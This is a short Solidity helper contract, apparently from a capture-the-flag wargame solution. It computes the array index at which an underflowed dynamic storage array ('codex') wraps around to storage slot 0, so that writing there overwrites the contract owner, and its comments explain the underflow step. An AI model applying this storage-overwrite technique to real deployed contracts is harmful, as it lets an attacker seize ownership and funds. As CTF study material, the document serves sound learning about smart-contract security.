pragma solidity ^0.4.25;

contract calculateIndex {

    bytes32 public one;
    uint public index;
    
    function getIndex() public view returns(uint) {
        one = keccak256(bytes32(1)); //the first element of codex stored at index 1 (because codex is array in slot1 full byte32)
        index = 2 ** 256 - 1 - uint(one) + 1; //the bool contact is store in first byte of slot0
        //the value of codex in slot1 is from 2 ** 256 - 1 or codex.length--; (underflow from size uint 256 minus 1)
        //check codex value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
        //we need to use value of codex in slot1 - first element of codex (refer to bool) +1 for overflow to the slot0 
        //which is index of owner that come after byte of bool.
        return index;
        //index is 35707666377435648211887908874984608119992236509074197713628505308453184860938
    }
    
}